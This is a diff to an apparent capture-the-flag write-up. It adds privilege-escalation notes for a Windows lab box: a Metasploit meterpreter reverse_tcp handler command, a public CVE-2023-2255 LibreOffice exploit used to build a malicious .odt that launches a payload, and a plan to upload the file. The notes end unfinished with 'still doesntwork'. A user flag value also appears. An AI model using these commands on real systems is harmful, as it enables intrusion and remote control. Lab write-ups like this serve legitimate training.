@@ -427,3 +427,21 @@ and we get the shell as tstark
 now we go cd c:\Users\tstark\Desktop> and get the user flag:
     c5bb6829dfd26187aaf6f305e5ee179b
 
+to escalate privileges we gonna be using LibreOffice 5 that located in c:\Program Files\LibreOffice 5>
+
+There is a CVE for this program 
+
+https://github.com/elweth-sec/CVE-2023-2255
+
+downloading it 
+
+making 1 more payload via msfconsole -x "use exploits/multi/handler; set lhost tun0;set lport 4447 ;set payload windows/x64/meterpreter/reverse_tcp; exploit
+
+now we need to create a RCE trigger using the CVE we downloaded:
+    python3 CVE-2023-2255.py --cmd "C:\users\public\r47.exe"  
+    File output.odt has been created !
+
+now we need to upload it to machine as web_account to  C:\xampp\htdocs\internal\applications>
+
+still doesntwork --- 
+
